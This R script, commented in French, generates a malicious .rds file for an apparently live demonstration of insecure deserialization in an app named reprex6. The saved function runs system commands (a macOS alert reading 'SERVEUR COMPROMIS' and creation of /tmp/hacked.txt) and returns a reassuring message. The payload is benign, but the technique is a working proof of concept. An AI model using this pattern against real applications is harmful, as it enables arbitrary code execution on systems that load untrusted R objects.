# Genere security/evil/evil.rds
# A executer depuis la racine du projet :
#   Rscript security/evil/make_evil.R

evil <- function() {
  # 1) Popup natif macOS — flagrant en live, l'audience voit la fenetre systeme surgir
  cmd <- "osascript -e 'display dialog \"SERVEUR COMPROMIS\\n\\nFichier /tmp/hacked.txt cree.\" with title \"Insecure Deserialization\" buttons {\"OK\"} with icon stop'"
  system(cmd, wait = FALSE)

  # 2) Side effect filesystem (preuve verifiable apres coup)
  system("touch /tmp/hacked.txt")

  # 3) Message rassurant retourne a l'app
  "\U0001F642 Tout va bien, rien a signaler ici"
}

output_path <- "security/evil/evil.rds"
saveRDS(evil, output_path)

cat("evil.rds genere dans", output_path, "\n")
cat("A uploader dans reprex6 pour declencher la demo.\n")
